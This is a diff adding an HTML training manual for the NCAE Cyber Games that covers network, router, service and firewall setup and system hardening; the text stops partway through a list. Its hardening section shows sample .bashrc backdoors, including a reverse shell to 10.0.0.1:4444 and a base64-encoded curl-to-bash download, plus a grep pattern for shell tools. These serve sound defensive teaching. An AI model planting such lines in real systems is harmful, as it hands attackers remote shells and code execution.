@@ -1,0 +1,1955 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NCAE Cyber Games Competition: Networking and Security Manual</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        h1, h2, h3, h4 {
+            color: #2c3e50;
+            margin-top: 1.5em;
+            margin-bottom: 0.5em;
+        }
+        h1 {
+            text-align: center;
+            font-size: 2em;
+            border-bottom: 2px solid #3498db;
+            padding-bottom: 10px;
+        }
+        h2 {
+            font-size: 1.6em;
+            border-bottom: 1px solid #ddd;
+            padding-bottom: 5px;
+        }
+        h3 {
+            font-size: 1.3em;
+        }
+        h4 {
+            font-size: 1.1em;
+        }
+        code {
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #f5f5f5;
+            padding: 2px 4px;
+            border-radius: 3px;
+        }
+        pre {
+            background-color: #f5f5f5;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-family: 'Courier New', Courier, monospace;
+            border: 1px solid #ddd;
+        }
+        ul, ol {
+            padding-left: 30px;
+        }
+        li {
+            margin-bottom: 5px;
+        }
+        table {
+            border-collapse: collapse;
+            width: 100%;
+            margin-bottom: 20px;
+        }
+        th, td {
+            border: 1px solid #ddd;
+            padding: 8px;
+            text-align: left;
+        }
+        th {
+            background-color: #f2f2f2;
+        }
+        hr {
+            border: 0;
+            height: 1px;
+            background-color: #ddd;
+            margin: 30px 0;
+        }
+        .toc {
+            background-color: #f8f9fa;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 30px;
+        }
+        .toc a {
+            text-decoration: none;
+            color: #3498db;
+        }
+        .toc a:hover {
+            text-decoration: underline;
+        }
+        .note {
+            background-color: #e7f3fe;
+            border-left: 4px solid #2196F3;
+            padding: 10px;
+            margin: 20px 0;
+        }
+        .warning {
+            background-color: #fffae6;
+            border-left: 4px solid #ffc107;
+            padding: 10px;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <h1>NCAE Cyber Games Competition: Networking and Security Manual</h1>
+
+    <div class="toc">
+        <h2>Table of Contents</h2>
+        <ol>
+            <li><a href="#introduction">Introduction</a></li>
+            <li><a href="#network-configuration">Network Configuration</a>
+                <ul>
+                    <li><a href="#understanding-network-interfaces">Understanding Network Interfaces</a></li>
+                    <li><a href="#ip-address-configuration">IP Address Configuration</a>
+                        <ul>
+                            <li><a href="#ubuntu-configuration-netplan">Ubuntu Configuration (NetPlan)</a></li>
+                            <li><a href="#kali-configuration-interfaces-file">Kali Configuration (Interfaces File)</a></li>
+                            <li><a href="#kali-configuration-networkmanager">Kali Configuration (NetworkManager)</a></li>
+                        </ul>
+                    </li>
+                    <li><a href="#network-testing-and-troubleshooting">Network Testing and Troubleshooting</a></li>
+                </ul>
+            </li>
+            <li><a href="#mikrotik-router-configuration">MikroTik Router Configuration</a>
+                <ul>
+                    <li><a href="#initial-setup">Initial Setup</a></li>
+                    <li><a href="#interface-configuration">Interface Configuration</a></li>
+                    <li><a href="#port-forwarding">Port Forwarding</a></li>
+                    <li><a href="#firewall-configuration">Firewall Configuration</a></li>
+                    <li><a href="#accessing-the-router">Accessing the Router</a></li>
+                    <li><a href="#router-security">Router Security</a></li>
+                </ul>
+            </li>
+            <li><a href="#service-configuration">Service Configuration</a>
+                <ul>
+                    <li><a href="#web-server-apache">Web Server (Apache)</a></li>
+                    <li><a href="#ssh-server">SSH Server</a>
+                        <ul>
+                            <li><a href="#basic-configuration">Basic Configuration</a></li>
+                            <li><a href="#passwordless-authentication">Passwordless Authentication</a></li>
+                            <li><a href="#managing-ssh-keys">Managing SSH Keys</a></li>
+                        </ul>
+                    </li>
+                    <li><a href="#dns-server-bind">DNS Server (BIND)</a>
+                        <ul>
+                            <li><a href="#forward-lookups">Forward Lookups</a></li>
+                            <li><a href="#reverse-lookups">Reverse Lookups</a></li>
+                        </ul>
+                    </li>
+                </ul>
+            </li>
+            <li><a href="#system-security">System Security</a>
+                <ul>
+                    <li><a href="#firewall-management">Firewall Management</a>
+                        <ul>
+                            <li><a href="#ufw-ubuntu">UFW (Ubuntu)</a></li>
+                            <li><a href="#iptables">IPTables</a></li>
+                            <li><a href="#mikrotik-firewall">MikroTik Firewall</a></li>
+                        </ul>
+                    </li>
+                    <li><a href="#monitoring-connections">Monitoring Connections</a></li>
+                    <li><a href="#active-defense-techniques">Active Defense Techniques</a></li>
+                    <li><a href="#system-hardening">System Hardening</a>
+                        <ul>
+                            <li><a href="#checking-for-malicious-files">Checking Files and Detecting Poisoned Binaries</a></li>
+                            <li><a href="#service-specific-hardening">Service-Specific Hardening</a></li>
+                            <li><a href="#sudo-configuration">Sudo Configuration</a></li>
+                            <li><a href="#user-security">User Account Security</a></li>
+                            <li><a href="#scoring-bot-protection">Distinguishing Scoring Bot vs. Red Team</a></li>
+                            <li><a href="#intruder-detection">Detecting and Removing Intruders</a></li>
+                            <li><a href="#firewall-ip-blocking">Firewall Configuration and IP Blocking</a></li>
+                            <li><a href="#additional-security">Additional Security Measures</a></li>
+                        </ul>
+                    </li>
+                </ul>
+            </li>
+            <li><a href="#backup-and-recovery">Backup and Recovery</a>
+                <ul>
+                    <li><a href="#using-rsync">Using RSync</a>
+                        <ul>
+                            <li><a href="#basic-rsync-command">Basic RSync Command Syntax</a></li>
+                            <li><a href="#incremental-backups">Incremental Backups</a></li>
+                            <li><a href="#remote-backups">Remote Backups Using SSH</a></li>
+                            <li><a href="#rsync-options">RSync Command Options</a></li>
+                        </ul>
+                    </li>
+                    <li><a href="#automated-backups">Automated Backups</a>
+                        <ul>
+                            <li><a href="#backup-schedules">Setting Up Backup Schedules</a></li>
+                            <li><a href="#secure-remote-backups">Secure Remote Backups</a></li>
+                            <li><a href="#key-based-authentication">Key-Based Authentication for Automated Backups</a></li>
+                        </ul>
+                    </li>
+                    <li><a href="#cron-jobs">Cron Jobs</a>
+                        <ul>
+                            <li><a href="#user-specific-crontabs">User-Specific Crontabs</a></li>
+                            <li><a href="#system-wide-crontabs">System-Wide Crontabs</a></li>
+                            <li><a href="#crontab-syntax">Crontab Syntax and Scheduling</a></li>
+                            <li><a href="#cron-security">Security Considerations for Automated Tasks</a></li>
+                            <li><a href="#managing-cron-jobs">Managing and Monitoring Cron Jobs</a></li>
+                        </ul>
+                    </li>
+                </ul>
+            </li>
+            <li><a href="#bash-scripting">Bash Scripting</a>
+                <ul>
+                    <li><a href="#basic-script-creation">Basic Script Creation</a>
+                        <ul>
+                            <li><a href="#first-script">Creating Your First Script</a></li>
+                            <li><a href="#shebang-line">Shebang Line</a></li>
+                            <li><a href="#script-execution">Script Execution Methods</a></li>
+                        </ul>
+                    </li>
+                    <li><a href="#variables-and-input">Variables and Input</a>
+                        <ul>
+                            <li><a href="#variable-assignment">Variable Assignment and Usage</a></li>
+                            <li><a href="#reading-user-input">Reading User Input</a></li>
+                            <li><a href="#command-substitution">Command Substitution</a></li>
+                        </ul>
+                    </li>
+                    <li><a href="#file-operations">File Operations</a>
+                        <ul>
+                            <li><a href="#file-paths">File Paths in Scripts</a></li>
+                            <li><a href="#reading-writing-files">Reading and Writing Files</a></li>
+                            <li><a href="#redirecting-output">Redirecting Output</a></li>
+                        </ul>
+                    </li>
+                    <li><a href="#script-permissions">Script Permissions</a>
+                        <ul>
+                            <li><a href="#execute-permissions">Setting Execute Permissions</a></li>
+                            <li><a href="#ownership">Understanding Ownership</a></li>
+                            <li><a href="#sudo-scripts">Running Scripts with Sudo</a></li>
+                        </ul>
+                    </li>
+                    <li><a href="#automating-tasks">Automating Tasks</a>
+                        <ul>
+                            <li><a href="#network-configuration-scripts">Network Configuration Scripts</a></li>
+                            <li><a href="#service-management-scripts">Service Management Scripts</a></li>
+                            <li><a href="#regex-processing">Regular Expression Processing</a></li>
+                            <li><a href="#error-handling">Error Handling in Scripts</a></li>
+                        </ul>
+                    </li>
+                </ul>
+            </li>
+            <li><a href="#competition-strategies">Competition Strategies</a>
+                <ul>
+                    <li><a href="#initial-assessment">Initial Assessment</a>
+                        <ul>
+                            <li><a href="#network-topology">Network Topology Understanding</a></li>
+                            <li><a href="#service-identification">Service Identification</a></li>
+                            <li><a href="#team-assignment">Team Number and Theme Assignment</a></li>
+                        </ul>
+                    </li>
+                    <li><a href="#securing-services">Securing Services</a>
+                        <ul>
+                            <li><a href="#service-prioritization">Service Prioritization</a></li>
+                            <li><a href="#configuration-backups">Configuration Backups</a></li>
+                            <li><a href="#scoring-requirements">Scoring Service Requirements</a></li>
+                        </ul>
+                    </li>
+                    <li><a href="#router-specific-considerations">Router-Specific Considerations</a>
+                        <ul>
+                            <li><a href="#port-forwarding-protocols">Port Forwarding Protocols (TCP vs UDP)</a></li>
+                            <li><a href="#firewall-zones">Firewall Zone Configuration</a></li>
+                            <li><a href="#service-vs-forward">Service vs Port Forward Understanding</a></li>
+                        </ul>
+                    </li>
+                    <li><a href="#monitoring-for-attacks">Monitoring for Attacks</a>
+                        <ul>
+                            <li><a href="#connection-monitoring">Connection Monitoring</a></li>
+                            <li><a href="#log-analysis">Log Analysis</a></li>
+                            <li><a href="#malicious-activity">Identifying Malicious Activity</a></li>
+                            <li><a href="#scoring-bot-vs-red-team">Distinguishing Scoring Bot vs. Red Team Activity</a></li>
+                            <li><a href="#real-time-response">Real-Time Response Strategies</a></li>
+                            <li><a href="#user-session-management">User Session Management</a></li>
+                        </ul>
+                    </li>
+                    <li><a href="#recovery-procedures">Recovery Procedures</a>
+                        <ul>
+                            <li><a href="#restoring-backups">Restoring from Backups</a></li>
+                            <li><a href="#rebuilding-services">Rebuilding Services</a></li>
+                            <li><a href="#service-availability">Maintaining Service Availability</a></li>
+                        </ul>
+                    </li>
+                </ul>
+            </li>
+        </ol>
+    </div>
+
+    <hr>
+
+    <section id="introduction">
+        <h2>Introduction</h2>
+        <p>This manual covers essential networking and security topics for the NCAE Cyber Games competition. It includes practical configurations, troubleshooting techniques, and security strategies for Linux systems. The competition environment consists of various machines including Ubuntu, Kali Linux, and MikroTik routers. This guide will help you understand how to configure, secure, and maintain these systems throughout the competition.</p>
+        <p>The competition typically assigns teams a unique team number, which must be incorporated into your IP addressing scheme. Understanding the network topology and successfully implementing it is fundamental to scoring points in the competition.</p>
+        <p>For the 2025 season, the competition has transitioned from CentOS routers to MikroTik routers. This represents an important change that competitors need to understand, as the configuration approaches are significantly different.</p>
+    </section>
+
+    <hr>
+
+    <section id="network-configuration">
+        <h2>Network Configuration</h2>
+
+        <section id="understanding-network-interfaces">
+            <h3>Understanding Network Interfaces</h3>
+            <p>Network interfaces connect your system to a network. Different Linux distributions name interfaces differently:</p>
+            <ul>
+                <li><strong>Ubuntu</strong>: Often named like <code>ens18</code>, <code>ens33</code>, etc.</li>
+                <li><strong>Kali Linux</strong>: Usually named <code>eth0</code>, <code>eth1</code>, etc.</li>
+                <li><strong>MikroTik Routers</strong>: Usually named <code>ether1</code>, <code>ether2</code>, etc.</li>
+            </ul>
+            <p>To identify interfaces on any Linux system:</p>
+            <pre>ip a</pre>
+            <p>This command shows all network interfaces along with their current configuration.</p>
+            <p>Legacy command (not available on all distributions):</p>
+            <pre>ifconfig</pre>
+            <p>On MikroTik routers, use:</p>
+            <pre>interface print</pre>
+        </section>
+
+        <section id="ip-address-configuration">
+            <h3>IP Address Configuration</h3>
+
+            <section id="ubuntu-configuration-netplan">
+                <h4>Ubuntu Configuration (NetPlan)</h4>
+                <p>Ubuntu uses NetPlan for network configuration. Configuration files are located in <code>/etc/netplan/</code> with <code>.yaml</code> extension.</p>
+                <p>Example configuration (<code>/etc/netplan/01-network-manager-all.yaml</code>):</p>
+                <pre>network:
+  version: 2
+  renderer: networkd
+  ethernets:
+    ens18:
+      addresses:
+        - 192.168.195.2/24
+      gateway4: 192.168.195.1
+      nameservers:
+        addresses: [192.168.195.2]</pre>
+                <p>After modifying, apply changes with:</p>
+                <pre>sudo netplan apply</pre>
+            </section>
+
+            <section id="kali-configuration-interfaces-file">
+                <h4>Kali Configuration (Interfaces File)</h4>
+                <p>Kali Linux uses <code>/etc/network/interfaces</code> for network configuration.</p>
+                <p>Example configuration:</p>
+                <pre>auto eth0
+iface eth0 inet static
+    address 192.168.195.100
+    netmask 255.255.255.0
+    gateway 192.168.195.1</pre>
+                <p>After modification, restart networking with:</p>
+                <pre>sudo systemctl restart networking</pre>
+            </section>
+            
+            <section id="kali-configuration-networkmanager">
+                <h4>Kali Configuration (NetworkManager)</h4>
+                <p>Many Kali Linux systems use NetworkManager for network configuration. You can configure it through the graphical interface or via the command line.</p>
+                
+                <p><strong>Using the nmcli command-line tool:</strong></p>
+                <pre># List all available connections
+nmcli connection show
+
+# Show details of a specific connection
+nmcli connection show "Wired connection 1"
+
+# Create a new static IP connection
+nmcli connection add con-name "static-eth0" type ethernet ifname eth0 ipv4.method manual ipv4.addresses 192.168.195.100/24 ipv4.gateway 192.168.195.1 ipv4.dns 192.168.195.1
+
+# Modify an existing connection
+nmcli connection modify "static-eth0" ipv4.addresses 192.168.195.101/24
+
+# Apply the changes by bringing the connection up
+nmcli connection up "static-eth0"
+
+# Delete a connection if needed
+nmcli connection delete "static-eth0"</pre>
+
+                <p><strong>Using the Network Manager configuration files:</strong></p>
+                <p>NetworkManager stores its configuration files in <code>/etc/NetworkManager/system-connections/</code>. Each connection has its own file:</p>
+                <pre>sudo nano /etc/NetworkManager/system-connections/static-eth0.nmconnection</pre>
+                <p>Example configuration file:</p>
+                <pre>[connection]
+id=static-eth0
+type=ethernet
+interface-name=eth0
+permissions=
+
+[ethernet]
+mac-address-blacklist=
+
+[ipv4]
+method=manual
+addresses=192.168.195.100/24
+gateway=192.168.195.1
+dns=192.168.195.1
+
+[ipv6]
+method=auto</pre>
+                <p>After modifying configuration files directly, restart NetworkManager:</p>
+                <pre>sudo systemctl restart NetworkManager</pre>
+                
+                <p>To check the current status of NetworkManager and active connections:</p>
+                <pre>nmcli general status
+nmcli device status</pre>
+                
+                <p><strong>Switching between connection types:</strong></p>
+                <p>If you need to switch from interfaces file to NetworkManager:</p>
+                <pre># First, ensure NetworkManager is installed
+sudo apt update
+sudo apt install network-manager
+
+# Enable and start the service
+sudo systemctl enable NetworkManager
+sudo systemctl start NetworkManager
+
+# Disable other networking services if necessary
+sudo systemctl disable networking  # Disables interfaces file configuration
+sudo systemctl mask networking</pre>
+            </section>
+        </section>
+
+        <section id="network-testing-and-troubleshooting">
+            <h3>Network Testing and Troubleshooting</h3>
+            <p>Test your network configuration with the following commands:</p>
+            <ol>
+                <li>Check your current IP configuration:
+                    <pre>ip a</pre>
+                </li>
+                <li>Test connectivity to another host:
+                    <pre>ping 192.168.195.1</pre>
+                </li>
+                <li>Check your routing table:
+                    <pre>ip route</pre>
+                </li>
+                <li>Test DNS resolution:
+                    <pre>nslookup example.com</pre>
+                </li>
+                <li>View active connections:
+                    <pre>ss -plant</pre>
+                </li>
+            </ol>
+        </section>
+    </section>
+
+    <hr>
+
+    <section id="mikrotik-router-configuration">
+        <h2>MikroTik Router Configuration</h2>
+
+        <section id="initial-setup">
+            <h3>Initial Setup</h3>
+            <p>The default login credentials for MikroTik:</p>
+            <ul>
+                <li><strong>Username</strong>: admin</li>
+                <li><strong>Password</strong>: (blank) - You'll be prompted to set one on first login</li>
+            </ul>
+            <p>After logging in, you'll be presented with a command-line interface. You'll need to accept the license agreement on first login.</p>
+        </section>
+
+        <section id="interface-configuration">
+            <h3>Interface Configuration</h3>
+            <p>View interfaces:</p>
+            <pre>interface print</pre>
+            <p>This will display all network interfaces. In the competition environment, you'll typically see interfaces like <code>ether3</code> and <code>ether4</code>.</p>
+            <p>Assign an IP address to an interface:</p>
+            <pre>/ip address add address=172.20.X.1/16 interface=ether3
+/ip address add address=192.168.X.1/24 interface=ether4</pre>
+            <p>Replace <code>X</code> with your team number.</p>
+            <p>Check IP addresses:</p>
+            <pre>/ip address print</pre>
+            <p>This will show all IP addresses assigned to interfaces on the router.</p>
+        </section>
+
+        <section id="port-forwarding">
+            <h3>Port Forwarding</h3>
+            <p>Port forwarding allows external traffic to reach internal services. This is crucial for the competition where the scoring system needs to reach your internal services.</p>
+            <p>Using the CLI:</p>
+            <pre>/ip firewall nat add chain=dstnat action=dst-nat to-addresses=192.168.X.2 to-ports=80 protocol=tcp dst-port=80</pre>
+            <p>For UDP traffic (like DNS on port 53):</p>
+            <pre>/ip firewall nat add chain=dstnat action=dst-nat to-addresses=192.168.X.2 to-ports=53 protocol=udp dst-port=53</pre>
+        </section>
+
+        <section id="firewall-configuration">
+            <h3>Firewall Configuration</h3>
+            <p>View firewall rules:</p>
+            <pre>/ip firewall filter print</pre>
+            <p>Add a service to the firewall:</p>
+            <pre>/ip firewall filter add chain=input action=accept protocol=tcp dst-port=22</pre>
+            <p>Configure masquerading (NAT) for internal networks:</p>
+            <pre>/ip firewall nat add chain=srcnat action=masquerade out-interface=ether3</pre>
+            <p>This allows devices on your internal network to access external networks.</p>
+        </section>
+
+        <section id="accessing-the-router">
+            <h3>Accessing the Router</h3>
+            <p>In the competition environment, you'll primarily access and manage the MikroTik router via the command-line interface (CLI):</p>
+            <ul>
+                <li><strong>Direct terminal access</strong> through the console connection</li>
+                <li><strong>SSH access</strong> once you've configured an IP address on the router</li>
+            </ul>
+            <p>Key router configuration areas include:</p>
+            <ul>
+                <li>Router identity</li>
+                <li>Passwords</li>
+                <li>IP addresses</li>
+                <li>DHCP server</li>
+                <li>Wireless settings (if applicable)</li>
+            </ul>
+        </section>
+
+        <section id="router-security">
+            <h3>Router Security</h3>
+            <p>Security considerations for your MikroTik router:</p>
+            <ol>
+                <li><strong>Change default credentials</strong>:
+                    <pre>/user set admin password=YourSecurePassword</pre>
+                </li>
+                <li><strong>Limit access to management services</strong>:
+                    <pre>/ip service set www address=192.168.X.0/24
+/ip service set ssh address=192.168.X.0/24</pre>
+                </li>
+                <li><strong>Disable unnecessary services</strong>:
+                    <pre>/ip service disable ftp
+/ip service disable telnet</pre>
+                </li>
+                <li><strong>Configure proper firewall rules</strong>:
+                    <pre>/ip firewall filter add chain=input action=drop connection-state=invalid</pre>
+                </li>
+                <li><strong>Update RouterOS if possible</strong>:
+                    <pre>/system package update check-for-updates
+/system package update download
+/system package update install</pre>
+                    <p class="note">(Note: This may not be possible in the competition environment)</p>
+                </li>
+            </ol>
+        </section>
+    </section>
+
+    <hr>
+
+    <section id="service-configuration">
+        <h2>Service Configuration</h2>
+
+        <section id="web-server-apache">
+            <h3>Web Server (Apache)</h3>
+            <p>Apache is a common web server in the competition. Configuration is located in <code>/etc/apache2/</code> on Ubuntu systems.</p>
+            <p>Install Apache (if not already installed):</p>
+            <pre>sudo apt update
+sudo apt install apache2</pre>
+            <p>Start and enable Apache:</p>
+            <pre>sudo systemctl start apache2
+sudo systemctl enable apache2</pre>
+            <p>Check status:</p>
+            <pre>sudo systemctl status apache2</pre>
+            <p>The default web page is located at <code>/var/www/html/index.html</code>. Modify this file to contain your team information:</p>
+            <pre>sudo nano /var/www/html/index.html</pre>
+            <p>Example content:</p>
+            <pre>This file is owned by team X</pre>
+        </section>
+
+        <section id="ssh-server">
+            <h3>SSH Server</h3>
+
+            <section id="basic-configuration">
+                <h4>Basic Configuration</h4>
+                <p>SSH configuration is located in <code>/etc/ssh/sshd_config</code>.</p>
+                <p>Important configuration options:</p>
+                <pre>Port 22                      # Default SSH port
+PermitRootLogin no           # Disallow direct root login
+PasswordAuthentication yes   # Allow password authentication</pre>
+                <p>After making changes, restart the SSH service:</p>
+                <pre>sudo systemctl restart ssh</pre>
+            </section>
+
+            <section id="passwordless-authentication">
+                <h4>Passwordless Authentication</h4>
+                <p>Generate SSH key pair:</p>
+                <pre>ssh-keygen -t ed25519</pre>
+                <p>Copy the public key to the target server:</p>
+                <pre>ssh-copy-id -i ~/.ssh/id_ed25519.pub username@192.168.X.2</pre>
+                <p>Alternatively, manually copy the public key:</p>
+                <pre># On the client
+cat ~/.ssh/id_ed25519.pub
+
+# On the server, add to ~/.ssh/authorized_keys
+mkdir -p ~/.ssh
+chmod 700 ~/.ssh
+echo "ssh-ed25519 AAAAC3..." >> ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys</pre>
+            </section>
+
+            <section id="managing-ssh-keys">
+                <h4>Managing SSH Keys</h4>
+                <p>SSH keys are stored in:</p>
+                <ul>
+                    <li>Private keys: <code>~/.ssh/id_*</code></li>
+                    <li>Public keys: <code>~/.ssh/id_*.pub</code></li>
+                    <li>Known hosts: <code>~/.ssh/known_hosts</code></li>
+                    <li>Authorized keys: <code>~/.ssh/authorized_keys</code></li>
+                </ul>
+                <p>Regenerate host keys if compromised:</p>
+                <pre>sudo ssh-keygen -t ecdsa -f /etc/ssh/ssh_host_ecdsa_key -N ""</pre>
+            </section>
+        </section>
+
+        <section id="dns-server-bind">
+            <h3>DNS Server (BIND)</h3>
+            <p>BIND (Berkeley Internet Name Domain) is a DNS server software. Configuration is primarily in <code>/etc/bind/</code>.</p>
+            <p>Install BIND (if not already installed):</p>
+            <pre>sudo apt update
+sudo apt install bind9</pre>
+            <p>Main configuration files:</p>
+            <ul>
+                <li><code>/etc/bind/named.conf</code>: Main configuration</li>
+                <li><code>/etc/bind/named.conf.options</code>: DNS server options</li>
+                <li><code>/etc/bind/named.conf.local</code>: Local zone definitions</li>
+                <li><code>/etc/bind/named.conf.default-zones</code>: Default zone information</li>
+            </ul>
+
+            <section id="forward-lookups">
+                <h4>Forward Lookups</h4>
+                <p>Forward lookups resolve domain names to IP addresses.</p>
+                <p>Example zone configuration in <code>/etc/bind/named.conf.default-zones</code>:</p>
+                <pre>zone "ncaecybergames.org" IN {
+    type master;
+    file "/etc/bind/zones/forward.ncaecybergames.org";
+    allow-update { none; };
+};</pre>
+                <p>Example zone file (<code>/etc/bind/zones/forward.ncaecybergames.org</code>):</p>
+                <pre>$TTL    604800
+@       IN      SOA     ncaecybergames.org. root.ncaecybergames.org. (
+                        2         ; Serial
+                        604800    ; Refresh
+                        86400     ; Retry
+                        2419200   ; Expire
+                        604800 )  ; Negative Cache TTL
+;
+@       IN      NS      sandbox-ubuntu
+sandbox-ubuntu  IN      A       192.168.X.2
+www     IN      A       192.168.X.2
+score   IN      A       172.20.0.1</pre>
+            </section>
+
+            <section id="reverse-lookups">
+                <h4>Reverse Lookups</h4>
+                <p>Reverse lookups resolve IP addresses to domain names.</p>
+                <p>Example zone configuration in <code>/etc/bind/named.conf.default-zones</code>:</p>
+                <pre>zone "X.168.192.in-addr.arpa" IN {
+    type master;
+    file "/etc/bind/zones/reverse.ncaecybergames.org";
+    allow-update { none; };
+};</pre>
+                <p>Example zone file (<code>/etc/bind/zones/reverse.ncaecybergames.org</code>):</p>
+                <pre>$TTL    604800
+@       IN      SOA     ncaecybergames.org. root.ncaecybergames.org. (
+                        3         ; Serial
+                        604800    ; Refresh
+                        86400     ; Retry
+                        2419200   ; Expire
+                        604800 )  ; Negative Cache TTL
+;
+@       IN      NS      sandbox-ubuntu.
+2       IN      PTR     www.ncaecybergames.org.
+2       IN      PTR     sandbox-ubuntu.ncaecybergames.org.</pre>
+                <p>After making changes, restart BIND:</p>
+                <pre>sudo systemctl restart named</pre>
+                <p>Test DNS resolution:</p>
+                <pre>nslookup www.ncaecybergames.org 192.168.X.2
+nslookup 192.168.X.2 192.168.X.2</pre>
+                <p>Configure a system to use your DNS server by editing <code>/etc/resolv.conf</code>:</p>
+                <pre>nameserver 192.168.X.2</pre>
+            </section>
+        </section>
+    </section>
+
+    <hr>
+
+    <section id="system-security">
+        <h2>System Security</h2>
+
+        <section id="firewall-management">
+            <h3>Firewall Management</h3>
+
+            <section id="ufw-ubuntu">
+                <h4>UFW (Ubuntu)</h4>
+                <p>Ubuntu comes with Uncomplicated Firewall (UFW), a simplified interface for iptables.</p>
+                <p>Basic commands:</p>
+                <pre># Check status
+sudo ufw status verbose
+
+# Enable firewall
+sudo ufw enable
+
+# Allow a service
+sudo ufw allow ssh
+
+# Allow specific IP
+sudo ufw allow from 192.168.X.100
+
+# Allow specific IP range
+sudo ufw allow from 192.168.X.0/24
+
+# Deny specific IP range
+sudo ufw deny from 10.0.0.0/8
+
+# Delete a rule (by number)
+sudo ufw status numbered
+sudo ufw delete 2
+
+# Reset all rules
+sudo ufw reset</pre>
+            </section>
+
+            <section id="iptables">
+                <h4>IPTables</h4>
+                <p>IPTables is a powerful firewall management tool available on most Linux distributions.</p>
+                <p>Basic commands:</p>
+                <pre># List rules
+sudo iptables -L
+
+# Allow SSH
+sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
+
+# Allow established connections
+sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+
+# Drop all other incoming traffic
+sudo iptables -A INPUT -j DROP
+
+# Save rules
+sudo iptables-save > /etc/iptables/rules.v4</pre>
+            </section>
+
+            <section id="mikrotik-firewall">
+                <h4>MikroTik Firewall</h4>
+                <p>MikroTik routers use their own firewall system. Here are some common commands:</p>
+                <pre># View all firewall rules
+/ip firewall filter print
+
+# Add a basic allow rule
+/ip firewall filter add chain=input protocol=tcp dst-port=80 action=accept
+
+# Add a deny rule
+/ip firewall filter add chain=input src-address=10.0.0.0/8 action=drop
+
+# Add a rule with connection tracking
+/ip firewall filter add chain=input connection-state=established,related action=accept
+
+# View NAT rules
+/ip firewall nat print
+
+# Add masquerading rule
+/ip firewall nat add chain=srcnat out-interface=ether1 action=masquerade
+
+# Enable/disable rules
+/ip firewall filter disable 2
+/ip firewall filter enable 2</pre>
+            </section>
+        </section>
+
+        <section id="monitoring-connections">
+            <h3>Monitoring Connections</h3>
+            <p>Monitor network connections and activity:</p>
+            <pre># View active connections
+ss -plant
+
+# Simplified active connections
+ss -tunap
+
+# Who is logged in
+w
+
+# Process listing
+ps aux
+
+# Real-time process monitoring
+top</pre>
+        </section>
+
+        <section id="active-defense-techniques">
+            <h3>Active Defense Techniques</h3>
+            <ol>
+                <li><strong>Monitoring for unauthorized access</strong>:
+                    <pre># Check for SSH connections
+ss -plant | grep :22</pre>
+                </li>
+                <li><strong>Terminating suspicious connections</strong>:
+                    <pre># Kill a process by ID
+sudo kill 1234
+                    
+# Kill all processes for a user
+sudo pkill -KILL -u jenny</pre>
+                </li>
+                <li><strong>Sending messages to users</strong>:
+                    <pre># Broadcast to all users
+wall "Server shutting down in 5 minutes. Please save your work."
+                    
+# Message to specific user
+write bob pts/2</pre>
+                </li>
+            </ol>
+        </section>
+
+        <section id="system-hardening">
+            <h3>System Hardening</h3>
+            <p>Comprehensive system hardening is essential during cyber competitions to protect against attacks while maintaining required services for scoring.</p>
+
+            <section id="checking-for-malicious-files">
+                <h4>Checking Files and Detecting Poisoned Binaries</h4>
+                <p><strong>Path Verification</strong></p>
+                <pre># Check system path for suspicious directories
+echo $PATH</pre>
+                <p><strong>Binary Verification</strong></p>
+                <pre># Generate and compare file hashes
+md5sum /bin/ls
+sha256sum /bin/bash
+
+# Find all instances of a command in PATH
+which -a ls
+
+# Verify file types
+file /bin/ls</pre>
+                
+                <p><strong>Shell Configuration Files and Backdoors</strong></p>
+                <p>Shell configuration files like <code>.bashrc</code> are prime targets for backdoors. Check these files for every user:</p>
+                <pre># List all users with home directories
+grep -E '/home/|/root' /etc/passwd | cut -d: -f1,6
+
+# Check common shell configuration files for suspicious content
+for user in $(grep /bin/bash /etc/passwd | cut -d: -f1); do
+  echo "=== Checking $user's shell config files ==="
+  for file in /home/$user/.bashrc /home/$user/.bash_profile /home/$user/.profile; do
+    if [ -f "$file" ]; then
+      echo "Examining $file"
+      # Look for suspicious code
+      grep -E 'curl|wget|nc|ncat|bash.*-i|sh.*-i|python.*-c|perl.*-e|exec|eval|base64' "$file"
+    fi
+  done
+done
+
+# Don't forget to check root's configuration files
+for file in /root/.bashrc /root/.bash_profile /root/.profile; do
+  if [ -f "$file" ]; then
+    echo "Examining $file"
+    grep -E 'curl|wget|nc|ncat|bash.*-i|sh.*-i|python.*-c|perl.*-e|exec|eval|base64' "$file"
+  fi
+done</pre>
+
+                <p>Common backdoor techniques to look for:</p>
+                <ul>
+                    <li><strong>Command aliases that mask standard commands</strong>: Look for <code>alias ls=...</code>, <code>alias cd=...</code></li>
+                    <li><strong>Malicious functions</strong>: Functions that execute hidden code while appearing normal</li>
+                    <li><strong>PATH manipulation</strong>: Adding suspicious directories to the beginning of PATH</li>
+                    <li><strong>Remote shells</strong>: Code that opens reverse shells (look for netcat, bash -i, etc.)</li>
+                    <li><strong>Base64-encoded commands</strong>: Obfuscated commands using <code>base64 -d | bash</code> pattern</li>
+                    <li><strong>Scheduled downloads</strong>: Commands that download and execute code from external sources</li>
+                    <li><strong>Persistence mechanisms</strong>: Code that ensures the backdoor gets reinstalled if removed</li>
+                </ul>
+
+                <p>Examples of suspicious code in <code>.bashrc</code>:</p>
+                <pre># Reverse shell hiding as a "system update" function
+function system_update() {
+    bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 &
+    echo "System update initiated."
+}
+
+# Malicious alias that captures commands
+alias sudo='history -a && sudo'
+
+# PATH manipulation to use trojaned binaries
+export PATH=~/bin:$PATH
+
+# Base64-encoded malicious payloads
+$(echo "Y3VybCAtcyBtYWx3YXJlLnNpdGUvYmFja2Rvb3IgfCBiYXNo" | base64 -d)
+
+# Keyloggers using PROMPT_COMMAND
+export PROMPT_COMMAND='history -a; HISTFILE=/tmp/.hist_$(whoami); history -a'</pre>
+
+                <p>When you find a suspicious entry:</p>
+                <ol>
+                    <li>Document it thoroughly before modification</li>
+                    <li>Understand what it does (safely analyze it)</li>
